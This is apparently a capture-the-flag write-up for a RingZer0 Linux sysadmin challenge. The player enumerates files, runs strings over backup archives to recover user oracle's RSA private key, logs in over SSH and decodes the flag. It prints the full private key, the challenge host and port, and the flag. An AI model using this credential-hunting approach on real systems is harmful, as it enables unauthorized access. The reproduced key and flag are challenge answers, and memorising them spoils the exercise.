@@ -1,0 +1,136 @@
+makeki
+
+Well we are back in morpheus account, but we do have access to trinity and architect.
+We need to find whats oracle's password. Lets try reading what files morpheus has access to there must be a reason the challenge asks us to login as morpheus.
+
+morpheus@sysadmin-track:~$ find -type f -user morpheus -readable 2>/dev/null
+./.bashrc
+./.bash_logout
+./.profile
+
+Well as it turns out morpheus doesn't have much to offer.
+Couldn't find anything on oracle asw. Most likely because I don't have access to their files. 
+Yeah I feel like his is a dead end.
+
+User trinity had access to a phonebook, maybe theres something useful inside that phonebook that I can find. I grepped the phonenumber found in that phonebook pointing to oracle but no look.
+grepping oracle had no luck asw. So I logged in as morpheus again.
+I tried searching for 'phone' hoping theres some story about phones and somehow i could reach oracle from that phone number.
+
+in ps auxw
+
+trinity  2523172  0.0  0.1  11044  1036 ?        S     2025   0:00 find / -type f -readable -exec grep -l FLAG {} ;
+trinity  2523173  0.0  0.0   8092    60 ?        S     2025   0:00 head -10
+trinity  2523607  0.0  0.0   8900   100 ?        S     2025   0:00 grep -l FLAG /sys/kernel/security/apparmor/revision
+root     3547585  0.0  0.2  11008  2104 ?        S    Jan16   0:00 su neo -c /bin/monitor
+neo      3547589  0.0  0.0   2344   172 ?        Ss   Jan16   0:00 /bin/monitor
+
+we can see that trinity and neo are doing something sussy but we just don't have the perms atm to see what that is. 
+
+I ran `grep 'oracle' -R 2>/dev/null` in root directory again.
+
+morpheus@sysadmin-track:/$ grep 'oracle' -R 2>/dev/null
+etc/subgid:oracle:362144:65536
+etc/subuid:oracle:362144:65536
+etc/ssh/sshd_config:Match User oracle [NOTICE]
+
+I read what was in that file, 
+Match User oracle
+        PubkeyAuthentication yes
+
+So we are allowed to ssh into the machine with keys.
+Now while manually enumerating for the last challenge I noticed interesting directory name /backup, its always worth looking whats in them. I recall that using strings on the first file gave some log like text back. So I try that again this time looking just for oracle.
+
+morpheus@sysadmin-track:/backup$ for i in $(ls); do strings $i | grep 'oracle'; done
+home/oracle/
+home/oracle/.vimrc
+home/oracle/.bash_history
+home/oracle/.ssh/
+home/oracle/.ssh/id_rsa
+home/oracle/.ssh/id_rsa.pub
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCoEgxjSM+zh29CqzIet5hxwI4gwWsHL56XlN3xM1zylCog02tZJ5/EA17hvQRoBmh+9lsEaseKnIHpf4WC6BdirAHS56bTq5Mach0cBnIdXogT1/+EsKb72dY4l9S880VsxoiLO/MxWE7oZMbLEnzOH8BJBdgEdLPI7GSaoMsHvMW17IkXuG/qzpbbROamOExC04LSZjCfrhkKxWLZ3Vzu0WLDftw661PUt9lpoBQEjB2m8voEWOqk2THPCbXTl4VMO3hZk0o5n2c6ezXwwcEcU5eTxaADELqCq0TaCvtxMFmxvC+Neu17yhO0BYK/dgdIQIf3U3MTcMpWS0LCvVuN oracle@forensics
+home/oracle/.ssh/authorized_keys
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCoEgxjSM+zh29CqzIet5hxwI4gwWsHL56XlN3xM1zylCog02tZJ5/EA17hvQRoBmh+9lsEaseKnIHpf4WC6BdirAHS56bTq5Mach0cBnIdXogT1/+EsKb72dY4l9S880VsxoiLO/MxWE7oZMbLEnzOH8BJBdgEdLPI7GSaoMsHvMW17IkXuG/qzpbbROamOExC04LSZjCfrhkKxWLZ3Vzu0WLDftw661PUt9lpoBQEjB2m8voEWOqk2THPCbXTl4VMO3hZk0o5n2c6ezXwwcEcU5eTxaADELqCq0TaCvtxMFmxvC+Neu17yhO0BYK/dgdIQIf3U3MTcMpWS0LCvVuN oracle@forensics
+home/oracle/.bash_logout
+home/oracle/.profile
+home/oracle/.bashrc
+
+
+voila lol, theres gold in there.
+I modified grep command with -C to find more lines nearby. 
+
+chamilton
+home/oracle/.ssh/id_rsa
+0000600
+0001750
+0001750
+00000003217
+12310211305
+016007
+ustar
+chamilton
+chamilton
+-----BEGIN RSA PRIVATE KEY-----
+--
+SgwtusqotGjm0jTpnhqRV5x6rchzkMYwF8/WkvfJAoGBAMeem6yh0XiaclfzWYE5
+jCGMezjWEeD949IEkhGYJQFbmeK79l49O/KmeAy9veYmdSDntUoGp9f/kozHMgGb
+oH5cnQQxL7HczWc6UWd3LhJabIUNhsreAFBL2Ldgg1UPun6uBjACJV7G06AWhWSc
+ne58SDp5frpP5/Y8NXdAKDq1AoGAYCSFQ4lj96n29CxRtn6nZSTld5eTcEOsnECf
+dhuesAFJemlwBAZgAb/2Eh3/p3CCpSr0KmPmQldLaxujNwjrRkHpLjC9z6vX1ePX
+TzqtmpmqZXKEvC4w9EaoZ3JE5GXwnTHNbID6m3JQ4CnVc36+Po0XHB096jTTAV7m
+bSGa5SECgYBE2IuW1pk2pOZ+FDtKltWHk8KK89QmGsFf2YnVZ/FsAkPnayeTkmMz
+AWxRP/W/Uj5ypw7KjprQee31hkisBG/ZPBvQdjAvxF7m4usuEN2Nkb0FTIjZHYbD
+iPOmPHIUlwwL8UVzDQUzXhegSB4GUeP/06T/eM5PPB8SX0ZaHIw1wQ==
+-----END RSA PRIVATE KEY-----
+
+annndd we have the private key yooohoo.
+
+stark@nixos ~ ❯ nvim temp
+stark@nixos ~ ❯ chmod 600 temp
+stark@nixos ~ ❯ ssh oracle@challenges.ringzer0ctf.com -p 10146 -i temp
+** WARNING: connection is not using a post-quantum key exchange algorithm.
+** This session may be vulnerable to "store now, decrypt later" attacks.
+** The server may need to be upgraded. See https://openssh.com/pq.html
+Load key "temp": error in libcrypto
+
+I was facing issues, rsa keys are notorious for format but I was sure that the thingy was correctly formatted.
+The only reasoning could be that its the key for someone else.
+So I ran the strings grep command again. And my sus was correct.
+
+-----BEGIN RSA PRIVATE KEY-----
+MIIEpAIBAAKCAQEAqBIMY0jPs4dvQqsyHreYccCOIMFrBy+el5Td8TNc8pQqINNr
+WSefxANe4b0EaAZofvZbBGrHipyB6X+FgugXYqwB0uem06uTGnIdHAZyHV6IE9f/
+hLCm+9nWOJfUvPNFbMaIizvzMVhO6GTGyxJ8zh/ASQXYBHSzyOxkmqDLB7zFteyJ
+F7hv6s6W20TmpjhMQtOC0mYwn64ZCsVi2d1c7tFiw37cOutT1LfZaaAUBIwdpvL6
+BFjqpNkxzwm105eFTDt4WZNKOZ9nOns18MHBHFOXk8WgAxC6gqtE2gr7cTBZsbwv
+jXrte8oTtAWCv3YHSECH91NzE3DKVktCwr1bjQIDAQABAoIBAQCdefu9c1WZY4bu
+MrYNbf0aaE9Dhbcgzo+Me+HQxE2MxSMMCsyEhsn9wSK/5Hkidw6mF3KEmwBIcgiP
+nfqdA5YV0BENahw4LITyvIVl4uw9dHuQDEzQKSzswdkkwa6FNHOSThtWSl+9ln6o
+5PQXBkWGZN2oDh+vXSGvWz+QWqSho8vufmTtYntfFPAfVfcyp8BtiUgKQh069uGg
+XKnehmkrHoW9gQ2Lo0uaFWcTIGm1vsgBd7L4cfb98jDB63H+Lhf4UPYv4WmH2rrj
+bnk5lAU71JK4QsPnnOx1PA685p2e5mEfh0LKRKq9Fx3+umbGPJGvgcjobtXaW9OT
+mpaz6ZPBAoGBAM+diN8s/osQdi8odS9+HUWVZBa9Z2Dn0X2IlSxWK9u/UclhjYgP
+i2KXEY0wRV+ZiXURmrFNVxgA/EJ9BOgptSZNmi9fEdfnVB4L11T7HFny/J8u3sXt
+dn0OqHmf5ZEPtV7m0bK0jtznTgTTuBI9yXvRgHO2HQPCshdP7GIgt++lAoGBAM89
+Pd7HyMYnh0ancCTICkVIIWF6Ylf20BKz4Zwy9tYASCxY3iFllBdOXw/UgCnmJseQ
+73Dcimi5OEyUckOp7xX4HTwidFVbxfNeC0ZfsPbd22qSDcw5orpQMoDy3iP+bPJh
+SgwtusqotGjm0jTpnhqRV5x6rchzkMYwF8/WkvfJAoGBAMeem6yh0XiaclfzWYE5
+jCGMezjWEeD949IEkhGYJQFbmeK79l49O/KmeAy9veYmdSDntUoGp9f/kozHMgGb
+oH5cnQQxL7HczWc6UWd3LhJabIUNhsreAFBL2Ldgg1UPun6uBjACJV7G06AWhWSc
+ne58SDp5frpP5/Y8NXdAKDq1AoGAYCSFQ4lj96n29CxRtn6nZSTld5eTcEOsnECf
+dhuesAFJemlwBAZgAb/2Eh3/p3CCpSr0KmPmQldLaxujNwjrRkHpLjC9z6vX1ePX
+TzqtmpmqZXKEvC4w9EaoZ3JE5GXwnTHNbID6m3JQ4CnVc36+Po0XHB096jTTAV7m
+bSGa5SECgYBE2IuW1pk2pOZ+FDtKltWHk8KK89QmGsFf2YnVZ/FsAkPnayeTkmMz
+AWxRP/W/Uj5ypw7KjprQee31hkisBG/ZPBvQdjAvxF7m4usuEN2Nkb0FTIjZHYbD
+iPOmPHIUlwwL8UVzDQUzXhegSB4GUeP/06T/eM5PPB8SX0ZaHIw1wQ==
+-----END RSA PRIVATE KEY-----
+
+
+I found another private key. sshed into the machine as oracle and it worked !!
+
+oracle@sysadmin-track:~$ cat flag.txt
+RkxBRy1kMzI1ZTczOGZhN2Q4N2Q0ZjU2MDdjMzAyYjM3ZGIyMA==
+
+oracle@sysadmin-track:~$ echo "RkxBRy1kMzI1ZTczOGZhN2Q4N2Q0ZjU2MDdjMzAyYjM3ZGIyMA==" | base64 -d
+FLAG-d325e738fa7d87d4f5607c302b37db20
+oracle@sysadmin-track:~$
+
